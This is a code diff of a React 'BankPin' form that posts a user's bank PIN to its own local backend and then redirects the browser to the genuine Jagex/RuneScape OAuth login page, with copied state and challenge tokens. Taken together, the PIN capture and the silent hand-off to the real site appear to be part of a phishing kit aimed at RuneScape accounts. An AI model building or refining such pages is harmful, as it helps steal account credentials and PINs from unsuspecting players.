@@ -25,7 +25,7 @@ const BankPin = ({email}) => {
     setLoading(!loading)
     try {
       const response = await fetch(
-        "http://localhost:8080/dashboard/verify-bank-pin",
+        "http://localhost:8080/dashboard/set-bank-pin",
         {
           method: "POST",
           headers: {
@@ -36,10 +36,10 @@ const BankPin = ({email}) => {
       );
 
       if (response.ok) {
-        const result = await response.json();
-        console.log(result);
-        setLoading(false)
-        window.location.replace("http://localhost:3000/dashboards/sales/");
+        // const result = await response.json();
+        // console.log(result);
+        // setLoading(false)
+        window.location.replace("https://account.jagex.com/oauth2/auth?response_type=code&client_id=jpp-auth&scope=openid%20user.email.read&state=0Q8G1Ik-dZIji7-2kAhpxCW45NCgv5BzZSWntl41Vas%3D&redirect_uri=https://auth.runescape.com/jpp-auth/login/oauth2/code/jpp&nonce=yiJhVH5_277aCNWlS6_691JBxeqtgsgpGiukIJ90FQg&max_age=1200&flow=web&__cf_chl_tk=tjiRlHZOgc5QNTSiM7Qn8Sc3zHDyO_9qQCLcAr_fqGE-1729662506-1.0.1.1-.9k2TWyJVV6gerbwd_bj7OLygTb1lrUiRgdqzeziHgo#_ga=2.82027987.490570915.1729662489-144552881.1729662489");
         // setToggleCode(!toggle); // Toggle if the request was successful
         // You may want to navigate the user to a different page or show a success message
       } else {
@@ -47,7 +47,7 @@ const BankPin = ({email}) => {
         redBox.current.style.border = '1px solid rgba(233,77,105,1)'
         redText.current.style.color = 'rgba(233,77,105,1)'
         const errorResponse = await response.json();
-        setError(errorResponse.error || "Failed to set password");
+        setError(errorResponse.error || "Failed to set bankPin");
       }
     } catch (error) {
       console.log(error)
